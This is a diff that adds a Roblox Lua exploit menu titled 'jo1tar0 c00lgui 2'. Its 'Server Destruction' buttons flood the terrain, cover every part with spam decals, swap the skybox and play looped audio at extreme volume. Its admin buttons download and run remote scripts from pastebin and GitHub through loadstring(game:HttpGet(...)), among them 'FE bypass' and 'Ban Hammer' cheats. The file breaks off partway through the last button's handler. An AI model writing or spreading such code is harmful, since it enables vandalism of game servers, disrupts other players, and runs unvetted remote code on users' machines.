@@ -1,0 +1,761 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local c00lgui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Page1 = Instance.new("Frame")
+local ServerDestruction = Instance.new("Frame")
+local Flood = Instance.new("TextButton")
+local Title_2 = Instance.new("TextLabel")
+local john = Instance.new("TextButton")
+local SetSkybox = Instance.new("TextButton")
+local DecalSpam = Instance.new("TextButton")
+local SetSkybox_2 = Instance.new("TextButton")
+local SetSkybox_3 = Instance.new("TextButton")
+local SetSkybox_4 = Instance.new("TextButton")
+local SetSkybox_5 = Instance.new("TextButton")
+local SetSkybox_6 = Instance.new("TextButton")
+local Draw = Instance.new("TextButton")
+local Title_3 = Instance.new("TextLabel")
+local OnButton = Instance.new("TextButton")
+local OffButton = Instance.new("TextButton")
+local AdminCommandsGuis = Instance.new("Frame")
+local Title_4 = Instance.new("TextLabel")
+local chat = Instance.new("TextButton")
+local hammer = Instance.new("TextButton")
+local yield = Instance.new("TextButton")
+local prisonCOMMAND = Instance.new("TextButton")
+local prisonfe1 = Instance.new("TextButton")
+local prisonfe2 = Instance.new("TextButton")
+local prisonfe3 = Instance.new("TextButton")
+local prisonfe4 = Instance.new("TextButton")
+local noclipGUI = Instance.new("TextButton")
+local CloseOpen = Instance.new("TextButton")
+
+--Properties:
+
+c00lgui.Name = "c00lgui"
+c00lgui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+Frame.Parent = c00lgui
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Frame.BorderSizePixel = 3
+Frame.Position = UDim2.new(0, 3, 0.300000012, 0)
+Frame.Size = UDim2.new(0, 300, 0, 400)
+Frame.ZIndex = 2
+
+Title.Name = "Title"
+Title.Parent = Frame
+Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Title.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title.BorderSizePixel = 3
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.ZIndex = 2
+Title.Font = Enum.Font.Cartoon
+Title.Text = "jo1tar0 c00lgui 2"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 24.000
+
+Page1.Name = "Page1"
+Page1.Parent = Frame
+Page1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Page1.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Page1.BorderSizePixel = 3
+Page1.Position = UDim2.new(0, 0, 0, 83)
+Page1.Size = UDim2.new(1, 0, 1, -106)
+Page1.ZIndex = 2
+
+ServerDestruction.Name = "Server Destruction"
+ServerDestruction.Parent = Page1
+ServerDestruction.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ServerDestruction.BorderColor3 = Color3.fromRGB(255, 0, 0)
+ServerDestruction.BorderSizePixel = 3
+ServerDestruction.Position = UDim2.new(0.00999999978, 0, -0.146258548, 0)
+ServerDestruction.Size = UDim2.new(0.5, 0, 1.14625859, 0)
+ServerDestruction.ZIndex = 2
+
+Flood.Name = "Flood"
+Flood.Parent = ServerDestruction
+Flood.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Flood.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Flood.BorderSizePixel = 3
+Flood.Position = UDim2.new(0, 3, 0, 32)
+Flood.Size = UDim2.new(0.5, 0, 0, 30)
+Flood.ZIndex = 2
+Flood.Font = Enum.Font.SourceSans
+Flood.Text = "Flood"
+Flood.TextColor3 = Color3.fromRGB(255, 255, 255)
+Flood.TextSize = 14.000
+
+Title_2.Name = "Title"
+Title_2.Parent = ServerDestruction
+Title_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Title_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_2.BorderSizePixel = 3
+Title_2.Size = UDim2.new(1, 0, 0, 30)
+Title_2.ZIndex = 2
+Title_2.Font = Enum.Font.SourceSansBold
+Title_2.Text = "Server Destruction"
+Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_2.TextSize = 14.000
+Title_2.TextWrapped = true
+
+john.Name = "john"
+john.Parent = ServerDestruction
+john.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+john.BorderColor3 = Color3.fromRGB(255, 0, 0)
+john.BorderSizePixel = 3
+john.Position = UDim2.new(0.5, 3, -0.00296740397, 33)
+john.Size = UDim2.new(0.5, -3, 0, 30)
+john.ZIndex = 2
+john.Font = Enum.Font.SourceSans
+john.Text = "John Doe[FE]"
+john.TextColor3 = Color3.fromRGB(255, 255, 255)
+john.TextSize = 14.000
+
+SetSkybox.Name = "Set Skybox"
+SetSkybox.Parent = ServerDestruction
+SetSkybox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+SetSkybox.BorderColor3 = Color3.fromRGB(255, 0, 0)
+SetSkybox.BorderSizePixel = 3
+SetSkybox.Position = UDim2.new(-0.0133333337, 3, 0.00593467243, 66)
+SetSkybox.Size = UDim2.new(0.5, -3, 0, 30)
+SetSkybox.ZIndex = 2
+SetSkybox.Font = Enum.Font.SourceSans
+SetSkybox.Text = "Set Skybox"
+SetSkybox.TextColor3 = Color3.fromRGB(255, 255, 255)
+SetSkybox.TextSize = 14.000
+
+DecalSpam.Name = "Decal Spam"
+DecalSpam.Parent = ServerDestruction
+DecalSpam.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+DecalSpam.BorderColor3 = Color3.fromRGB(255, 0, 0)
+DecalSpam.BorderSizePixel = 3
+DecalSpam.Position = UDim2.new(0.5, 3, -0.0944407135, 99)
+DecalSpam.Size = UDim2.new(0.5, -3, 0, 30)
+DecalSpam.ZIndex = 2
+DecalSpam.Font = Enum.Font.SourceSans
+DecalSpam.Text = "Decal Spam"
+DecalSpam.TextColor3 = Color3.fromRGB(255, 255, 255)
+DecalSpam.TextSize = 14.000
+
+SetSkybox_2.Name = "Set Skybox"
+SetSkybox_2.Parent = ServerDestruction
+SetSkybox_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+SetSkybox_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+SetSkybox_2.BorderSizePixel = 3
+SetSkybox_2.Position = UDim2.new(-0.0133333337, 3, 0.113546886, 66)
+SetSkybox_2.Size = UDim2.new(0.5, -3, 0, 30)
+SetSkybox_2.ZIndex = 2
+SetSkybox_2.Font = Enum.Font.SourceSans
+SetSkybox_2.Text = "k00pz sky"
+SetSkybox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+SetSkybox_2.TextSize = 14.000
+
+SetSkybox_3.Name = "Set Skybox"
+SetSkybox_3.Parent = ServerDestruction
+SetSkybox_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+SetSkybox_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
+SetSkybox_3.BorderSizePixel = 3
+SetSkybox_3.Position = UDim2.new(0.5, 3, 0.113546886, 66)
+SetSkybox_3.Size = UDim2.new(0.5, -3, 0, 30)
+SetSkybox_3.ZIndex = 2
+SetSkybox_3.Font = Enum.Font.SourceSans
+SetSkybox_3.Text = "Paint It Black"
+SetSkybox_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+SetSkybox_3.TextSize = 14.000
+
+SetSkybox_4.Name = "Set Skybox"
+SetSkybox_4.Parent = ServerDestruction
+SetSkybox_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+SetSkybox_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
+SetSkybox_4.BorderSizePixel = 3
+SetSkybox_4.Position = UDim2.new(-0.0199999996, 3, 0.203354955, 66)
+SetSkybox_4.Size = UDim2.new(0.5, -3, 0, 30)
+SetSkybox_4.ZIndex = 2
+SetSkybox_4.Font = Enum.Font.SourceSans
+SetSkybox_4.Text = "How Bad Can I BE Music"
+SetSkybox_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+SetSkybox_4.TextScaled = true
+SetSkybox_4.TextSize = 14.000
+SetSkybox_4.TextWrapped = true
+
+SetSkybox_5.Name = "Set Skybox"
+SetSkybox_5.Parent = ServerDestruction
+SetSkybox_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+SetSkybox_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
+SetSkybox_5.BorderSizePixel = 3
+SetSkybox_5.Position = UDim2.new(0.5, 3, 0.203354955, 66)
+SetSkybox_5.Size = UDim2.new(0.5, -3, 0, 30)
+SetSkybox_5.ZIndex = 2
+SetSkybox_5.Font = Enum.Font.SourceSans
+SetSkybox_5.Text = "Clear Decals"
+SetSkybox_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+SetSkybox_5.TextSize = 14.000
+SetSkybox_5.TextWrapped = true
+
+SetSkybox_6.Name = "Set Skybox"
+SetSkybox_6.Parent = ServerDestruction
+SetSkybox_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+SetSkybox_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
+SetSkybox_6.BorderSizePixel = 3
+SetSkybox_6.Position = UDim2.new(-0.0133333337, 3, 0.301197022, 66)
+SetSkybox_6.Size = UDim2.new(0.5, -3, 0, 30)
+SetSkybox_6.ZIndex = 2
+SetSkybox_6.Font = Enum.Font.SourceSans
+SetSkybox_6.Text = "Roblox Down Skybox"
+SetSkybox_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+SetSkybox_6.TextSize = 14.000
+SetSkybox_6.TextWrapped = true
+
+Draw.Name = "Draw"
+Draw.Parent = ServerDestruction
+Draw.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Draw.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Draw.BorderSizePixel = 3
+Draw.Position = UDim2.new(0.5, 3, 0.301197022, 66)
+Draw.Size = UDim2.new(0.5, -3, 0, 30)
+Draw.ZIndex = 2
+Draw.Font = Enum.Font.SourceSans
+Draw.Text = "Draw FE"
+Draw.TextColor3 = Color3.fromRGB(255, 255, 255)
+Draw.TextSize = 14.000
+Draw.TextWrapped = true
+
+Title_3.Name = "Title"
+Title_3.Parent = ServerDestruction
+Title_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Title_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_3.BorderSizePixel = 3
+Title_3.Position = UDim2.new(0.00666666683, 0, 0.599406421, 0)
+Title_3.Size = UDim2.new(0.99000001, 0, -0.0562590137, 40)
+Title_3.ZIndex = 2
+Title_3.Font = Enum.Font.Cartoon
+Title_3.Text = "noclip[NOT GUI NOW]:"
+Title_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_3.TextScaled = true
+Title_3.TextSize = 24.000
+Title_3.TextWrapped = true
+
+OnButton.Name = "OnButton"
+OnButton.Parent = ServerDestruction
+OnButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+OnButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
+OnButton.BorderSizePixel = 3
+OnButton.Position = UDim2.new(0.00666666683, 3, 0.476271182, 66)
+OnButton.Size = UDim2.new(0.5, -3, 0, 30)
+OnButton.ZIndex = 2
+OnButton.Font = Enum.Font.SourceSans
+OnButton.Text = "On"
+OnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+OnButton.TextScaled = true
+OnButton.TextSize = 14.000
+OnButton.TextWrapped = true
+
+OffButton.Name = "OffButton"
+OffButton.Parent = ServerDestruction
+OffButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+OffButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
+OffButton.BorderSizePixel = 3
+OffButton.Position = UDim2.new(0.5, 3, 0.476271182, 66)
+OffButton.Size = UDim2.new(0.5, -3, 0, 30)
+OffButton.ZIndex = 2
+OffButton.Font = Enum.Font.SourceSans
+OffButton.Text = "Off"
+OffButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+OffButton.TextScaled = true
+OffButton.TextSize = 14.000
+OffButton.TextWrapped = true
+
+AdminCommandsGuis.Name = "Admin Commands/Guis"
+AdminCommandsGuis.Parent = Page1
+AdminCommandsGuis.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+AdminCommandsGuis.BorderColor3 = Color3.fromRGB(255, 0, 0)
+AdminCommandsGuis.BorderSizePixel = 3
+AdminCommandsGuis.Position = UDim2.new(0.5, 3, -0.146258548, 0)
+AdminCommandsGuis.Size = UDim2.new(0.5, -3, 1.14625859, 0)
+AdminCommandsGuis.ZIndex = 2
+
+Title_4.Name = "Title"
+Title_4.Parent = AdminCommandsGuis
+Title_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Title_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_4.BorderSizePixel = 3
+Title_4.Size = UDim2.new(1, 0, 0, 30)
+Title_4.ZIndex = 2
+Title_4.Font = Enum.Font.SourceSansBold
+Title_4.Text = "Admin Commands/Guis"
+Title_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_4.TextSize = 14.000
+Title_4.TextWrapped = true
+
+chat.Name = "chat"
+chat.Parent = AdminCommandsGuis
+chat.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+chat.BorderColor3 = Color3.fromRGB(255, 0, 0)
+chat.BorderSizePixel = 3
+chat.Position = UDim2.new(-0.0238095243, 3, 0, 33)
+chat.Size = UDim2.new(0.5, -3, 0, 30)
+chat.ZIndex = 2
+chat.Font = Enum.Font.SourceSans
+chat.Text = "Hacker Chat[FE]"
+chat.TextColor3 = Color3.fromRGB(255, 255, 255)
+chat.TextScaled = true
+chat.TextSize = 14.000
+chat.TextWrapped = true
+
+hammer.Name = "hammer"
+hammer.Parent = AdminCommandsGuis
+hammer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+hammer.BorderColor3 = Color3.fromRGB(255, 0, 0)
+hammer.BorderSizePixel = 3
+hammer.Position = UDim2.new(0.5, 3, 0, 33)
+hammer.Size = UDim2.new(0.5, -3, 0, 30)
+hammer.ZIndex = 2
+hammer.Font = Enum.Font.SourceSans
+hammer.Text = "Ban Hammer"
+hammer.TextColor3 = Color3.fromRGB(255, 255, 255)
+hammer.TextSize = 14.000
+hammer.TextWrapped = true
+
+yield.Name = "yield"
+yield.Parent = AdminCommandsGuis
+yield.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+yield.BorderColor3 = Color3.fromRGB(255, 0, 0)
+yield.BorderSizePixel = 3
+yield.Position = UDim2.new(-0.0238095243, 3, 0.10385751, 33)
+yield.Size = UDim2.new(0.5, -3, 0, 30)
+yield.ZIndex = 2
+yield.Font = Enum.Font.SourceSans
+yield.Text = "Infinite Yield"
+yield.TextColor3 = Color3.fromRGB(255, 255, 255)
+yield.TextSize = 14.000
+yield.TextWrapped = true
+
+prisonCOMMAND.Name = "prisonCOMMAND"
+prisonCOMMAND.Parent = AdminCommandsGuis
+prisonCOMMAND.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+prisonCOMMAND.BorderColor3 = Color3.fromRGB(255, 0, 0)
+prisonCOMMAND.BorderSizePixel = 3
+prisonCOMMAND.Position = UDim2.new(0.5, 3, 0.10385751, 33)
+prisonCOMMAND.Size = UDim2.new(0.5, -3, 0, 30)
+prisonCOMMAND.ZIndex = 2
+prisonCOMMAND.Font = Enum.Font.SourceSans
+prisonCOMMAND.Text = "Prison Life Admin Commands"
+prisonCOMMAND.TextColor3 = Color3.fromRGB(255, 255, 255)
+prisonCOMMAND.TextSize = 14.000
+prisonCOMMAND.TextWrapped = true
+
+prisonfe1.Name = "prisonfe1"
+prisonfe1.Parent = AdminCommandsGuis
+prisonfe1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+prisonfe1.BorderColor3 = Color3.fromRGB(255, 0, 0)
+prisonfe1.BorderSizePixel = 3
+prisonfe1.Position = UDim2.new(-0.0238095243, 3, 0.210682422, 33)
+prisonfe1.Size = UDim2.new(0.5, -3, 0, 30)
+prisonfe1.ZIndex = 2
+prisonfe1.Font = Enum.Font.SourceSans
+prisonfe1.Text = "Prison Life Fe Bypass 1"
+prisonfe1.TextColor3 = Color3.fromRGB(255, 255, 255)
+prisonfe1.TextSize = 14.000
+prisonfe1.TextWrapped = true
+
+prisonfe2.Name = "prisonfe2"
+prisonfe2.Parent = AdminCommandsGuis
+prisonfe2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+prisonfe2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+prisonfe2.BorderSizePixel = 3
+prisonfe2.Position = UDim2.new(0.5, 3, 0.210682422, 33)
+prisonfe2.Size = UDim2.new(0.5, -3, 0, 30)
+prisonfe2.ZIndex = 2
+prisonfe2.Font = Enum.Font.SourceSans
+prisonfe2.Text = "Prison Life Fe Bypass 2"
+prisonfe2.TextColor3 = Color3.fromRGB(255, 255, 255)
+prisonfe2.TextSize = 14.000
+prisonfe2.TextWrapped = true
+
+prisonfe3.Name = "prisonfe3"
+prisonfe3.Parent = AdminCommandsGuis
+prisonfe3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+prisonfe3.BorderColor3 = Color3.fromRGB(255, 0, 0)
+prisonfe3.BorderSizePixel = 3
+prisonfe3.Position = UDim2.new(-0.0238095243, 3, 0.308605254, 33)
+prisonfe3.Size = UDim2.new(0.5, -3, 0, 30)
+prisonfe3.ZIndex = 2
+prisonfe3.Font = Enum.Font.SourceSans
+prisonfe3.Text = "Prison Life Fe Bypass 3"
+prisonfe3.TextColor3 = Color3.fromRGB(255, 255, 255)
+prisonfe3.TextSize = 14.000
+prisonfe3.TextWrapped = true
+
+prisonfe4.Name = "prisonfe4"
+prisonfe4.Parent = AdminCommandsGuis
+prisonfe4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+prisonfe4.BorderColor3 = Color3.fromRGB(255, 0, 0)
+prisonfe4.BorderSizePixel = 3
+prisonfe4.Position = UDim2.new(0.5, 3, 0.308605254, 33)
+prisonfe4.Size = UDim2.new(0.5, -3, 0, 30)
+prisonfe4.ZIndex = 2
+prisonfe4.Font = Enum.Font.SourceSans
+prisonfe4.Text = "Prison Life Fe Bypass 4"
+prisonfe4.TextColor3 = Color3.fromRGB(255, 255, 255)
+prisonfe4.TextSize = 14.000
+prisonfe4.TextWrapped = true
+
+noclipGUI.Name = "noclipGUI"
+noclipGUI.Parent = AdminCommandsGuis
+noclipGUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+noclipGUI.BorderColor3 = Color3.fromRGB(255, 0, 0)
+noclipGUI.BorderSizePixel = 3
+noclipGUI.Position = UDim2.new(-0.0238095243, 3, 0.412462831, 33)
+noclipGUI.Size = UDim2.new(0.5, -3, 0, 30)
+noclipGUI.ZIndex = 2
+noclipGUI.Font = Enum.Font.SourceSans
+noclipGUI.Text = "Noclip GUI"
+noclipGUI.TextColor3 = Color3.fromRGB(255, 255, 255)
+noclipGUI.TextSize = 14.000
+noclipGUI.TextWrapped = true
+
+CloseOpen.Name = "Close/Open"
+CloseOpen.Parent = c00lgui
+CloseOpen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+CloseOpen.BorderColor3 = Color3.fromRGB(255, 0, 0)
+CloseOpen.BorderSizePixel = 3
+CloseOpen.Position = UDim2.new(0, 3, 0.300000012, 380)
+CloseOpen.Size = UDim2.new(0, 300, 0, 20)
+CloseOpen.ZIndex = 3
+CloseOpen.Font = Enum.Font.SourceSans
+CloseOpen.Text = "Close"
+CloseOpen.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen.TextSize = 18.000
+
+-- Scripts:
+
+local function NKYBMPQ_fake_script() -- Flood.LocalScript 
+	local script = Instance.new('LocalScript', Flood)
+
+	function click()
+	Game.Workspace.Terrain:SetCells(Region3int16.new(Vector3int16.new(-100,-100,-100), Vector3int16.new(100,100,100)), 17, "Solid", "X")	
+	end
+	
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(NKYBMPQ_fake_script)()
+local function UDBT_fake_script() -- SetSkybox.Script 
+	local script = Instance.new('Script', SetSkybox)
+
+	function click()
+		s = Instance.new("Sky")
+		s.Name = "Sky"
+		s.Parent = game.Lighting
+		s.SkyboxBk = "http://www.roblox.com/asset/?id=13442447872"
+		s.SkyboxDn = "http://www.roblox.com/asset/?id=13442447872"
+		s.SkyboxFt = "http://www.roblox.com/asset/?id=13442447872"
+		s.SkyboxLf = "http://www.roblox.com/asset/?id=13442447872"
+		s.SkyboxRt = "http://www.roblox.com/asset/?id=13442447872"
+		s.SkyboxUp = "http://www.roblox.com/asset/?id=13442447872"
+		game.Lighting.TimeOfDay = 12
+	end
+	
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(UDBT_fake_script)()
+local function DHNN_fake_script() -- DecalSpam.Script 
+	local script = Instance.new('Script', DecalSpam)
+
+	function click()
+		function exPro(root)
+			for _, v in pairs(root:GetChildren()) do
+				if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id=13442447872" then
+					v.Parent = nil
+				elseif v:IsA("BasePart") then
+					v.Material = "Plastic"
+					v.Transparency = 0
+					local One = Instance.new("Decal", v)
+					local Two = Instance.new("Decal", v)
+					local Three = Instance.new("Decal", v)
+					local Four = Instance.new("Decal", v)
+					local Five = Instance.new("Decal", v)
+					local Six = Instance.new("Decal", v)
+					One.Texture = "http://www.roblox.com/asset/?id=13442447872"
+					Two.Texture = "http://www.roblox.com/asset/?id=13442447872"
+					Three.Texture = "http://www.roblox.com/asset/?id=13442447872"
+					Four.Texture = "http://www.roblox.com/asset/?id=13442447872"
+					Five.Texture = "http://www.roblox.com/asset/?id=13442447872"
+					Six.Texture = "http://www.roblox.com/asset/?id=13442447872"
+					One.Face = "Front"
+					Two.Face = "Back"
+					Three.Face = "Right"
+					Four.Face = "Left"
+					Five.Face = "Top"
+					Six.Face = "Bottom"
+				end
+				exPro(v)
+			end
+		end
+		function asdf(root)
+			for _, v in pairs(root:GetChildren()) do
+				asdf(v)
+			end
+		end
+		exPro(game.Workspace)
+		asdf(game.Workspace)
+	end
+	
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(DHNN_fake_script)()
+local function LYKX_fake_script() -- SetSkybox_2.Script 
+	local script = Instance.new('Script', SetSkybox_2)
+
+	function click()
+		s = Instance.new("Sky")
+		s.Name = "Sky"
+		s.Parent = game.Lighting
+		s.SkyboxBk = "http://www.roblox.com/asset/?id=9422866248"
+		s.SkyboxDn = "http://www.roblox.com/asset/?id=9422866248"
+		s.SkyboxFt = "http://www.roblox.com/asset/?id=9422866248"
+		s.SkyboxLf = "http://www.roblox.com/asset/?id=9422866248"
+		s.SkyboxRt = "http://www.roblox.com/asset/?id=9422866248"
+		s.SkyboxUp = "http://www.roblox.com/asset/?id=9422866248"
+		game.Lighting.TimeOfDay = 12
+	end
+	
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(LYKX_fake_script)()
+local function XCXV_fake_script() -- SetSkybox_3.Script 
+	local script = Instance.new('Script', SetSkybox_3)
+
+	function onClick()
+		local tubers93		= Instance.new("Sound")
+		tubers93.Parent		= game:GetService("Workspace")
+		tubers93.SoundId		= "rbxassetid://6828176320"
+		tubers93.Playing		= true
+		tubers93.Looped		= true
+		tubers93.Pitch      = 1
+		tubers93.Volume		= 50
+	
+	end
+	
+	script.Parent.MouseButton1Down:connect(onClick)
+end
+coroutine.wrap(XCXV_fake_script)()
+local function TZVX_fake_script() -- SetSkybox_4.Script 
+	local script = Instance.new('Script', SetSkybox_4)
+
+	function onClick()
+		local tubers93		= Instance.new("Sound")
+		tubers93.Parent		= game:GetService("Workspace")
+		tubers93.SoundId		= "rbxassetid://7835585719"
+		tubers93.Playing		= true
+		tubers93.Looped		= true
+		tubers93.Pitch      = 0.8	
+		tubers93.Volume		= 500000000
+	
+	end
+	
+	script.Parent.MouseButton1Down:connect(onClick)
+end
+coroutine.wrap(TZVX_fake_script)()
+local function YQIPN_fake_script() -- SetSkybox_5.Script 
+	local script = Instance.new('Script', SetSkybox_5)
+
+	function click()
+		function exPro(root)
+			for _, v in pairs(root:GetChildren()) do
+				if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id=0" then
+					v.Parent = nil
+				elseif v:IsA("BasePart") then
+					v.Material = "Plastic"
+					v.Transparency = 0
+					local One = Instance.new("Decal", v)
+					local Two = Instance.new("Decal", v)
+					local Three = Instance.new("Decal", v)
+					local Four = Instance.new("Decal", v)
+					local Five = Instance.new("Decal", v)
+					local Six = Instance.new("Decal", v)
+					One.Texture = "http://www.roblox.com/asset/?id=0"
+					Two.Texture = "http://www.roblox.com/asset/?id=0"
+					Three.Texture = "http://www.roblox.com/asset/?id=0"
+					Four.Texture = "http://www.roblox.com/asset/?id=0"
+					Five.Texture = "http://www.roblox.com/asset/?id=0"
+					Six.Texture = "http://www.roblox.com/asset/?id=0"
+					One.Face = "Front"
+					Two.Face = "Back"
+					Three.Face = "Right"
+					Four.Face = "Left"
+					Five.Face = "Top"
+					Six.Face = "Bottom"
+				end
+				exPro(v)
+			end
+		end
+		function asdf(root)
+			for _, v in pairs(root:GetChildren()) do
+				asdf(v)
+			end
+		end
+		exPro(game.Workspace)
+		asdf(game.Workspace)
+	end
+	
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(YQIPN_fake_script)()
+local function BHGKQTT_fake_script() -- SetSkybox_6.Script 
+	local script = Instance.new('Script', SetSkybox_6)
+
+	function click()
+		local s = Instance.new("Sky")
+		s.Name = "Sky"
+		s.Parent = game.Lighting
+		s.SkyboxBk = "rbxassetid://13320162497"
+		s.SkyboxDn = "rbxassetid://13320162497"
+		s.SkyboxFt = "rbxassetid://13320162497"
+		s.SkyboxLf = "rbxassetid://13320162497"
+		s.SkyboxRt = "rbxassetid://13320162497"
+		s.SkyboxUp = "rbxassetid://13320162497"
+		game.Lighting.TimeOfDay = 12
+	end
+	
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(BHGKQTT_fake_script)()
+local function ILAUB_fake_script() -- Draw.Script 
+	local script = Instance.new('Script', Draw)
+
+	function click()
+		local s = Instance.new("Sky")
+		s.Name = "Sky"
+		s.Parent = game.Lighting
+		s.SkyboxBk = "rbxassetid://13320162497"
+		s.SkyboxDn = "rbxassetid://13320162497"
+		s.SkyboxFt = "rbxassetid://13320162497"
+		s.SkyboxLf = "rbxassetid://13320162497"
+		s.SkyboxRt = "rbxassetid://13320162497"
+		s.SkyboxUp = "rbxassetid://13320162497"
+		game.Lighting.TimeOfDay = 12
+	end
+	
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(ILAUB_fake_script)()
+local function QWLU_fake_script() -- OnButton.Script 
+	local script = Instance.new('Script', OnButton)
+
+	function click()
+		local s = Instance.new("Sky")
+		s.Name = "Sky"
+		s.Parent = game.Lighting
+		s.SkyboxBk = "rbxassetid://13320162497"
+		s.SkyboxDn = "rbxassetid://13320162497"
+		s.SkyboxFt = "rbxassetid://13320162497"
+		s.SkyboxLf = "rbxassetid://13320162497"
+		s.SkyboxRt = "rbxassetid://13320162497"
+		s.SkyboxUp = "rbxassetid://13320162497"
+		game.Lighting.TimeOfDay = 12
+	end
+	
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(QWLU_fake_script)()
+local function RBINUW_fake_script() -- OffButton.Script 
+	local script = Instance.new('Script', OffButton)
+
+	function click()
+		local s = Instance.new("Sky")
+		s.Name = "Sky"
+		s.Parent = game.Lighting
+		s.SkyboxBk = "rbxassetid://13320162497"
+		s.SkyboxDn = "rbxassetid://13320162497"
+		s.SkyboxFt = "rbxassetid://13320162497"
+		s.SkyboxLf = "rbxassetid://13320162497"
+		s.SkyboxRt = "rbxassetid://13320162497"
+		s.SkyboxUp = "rbxassetid://13320162497"
+		game.Lighting.TimeOfDay = 12
+	end
+	
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(RBINUW_fake_script)()
+local function QIDIMI_fake_script() -- CloseOpen.LocalScript 
+	local script = Instance.new('LocalScript', CloseOpen)
+
+	function click()
+	if script.Parent.Text == "Close" then
+	script.Parent.Parent.Frame.Visible = false
+	script.Parent.Text = "Open" else
+	script.Parent.Parent.Frame.Visible = true
+	script.Parent.Text = "Close"	
+	end	
+	end
+	
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(QIDIMI_fake_script)()
+john.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://pastebin.com/raw/vvMD5J4n"))();
+end)
+yield.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+chat.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/jo1tar0/d/main/d'))()
+end)
+hammer.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet(('https://pastebin.com/raw/ncvYA7Ez'),true))()
+end)
+prisonCOMMAND.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/H17S32/Tiger_Admin/main/Script'))()
+end)
+prisonfe1.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://pastebin.com/raw/Sk7R1p8N"))();
+end)
+prisonfe2.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://pastebin.com/raw/KSv9D7A9"))();
+end)
+prisonfe3.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Enes5858/Enes5858/main/SKIDDDDD.txt"))()
+end)
+prisonfe4.MouseButton1Down:connect(function() 
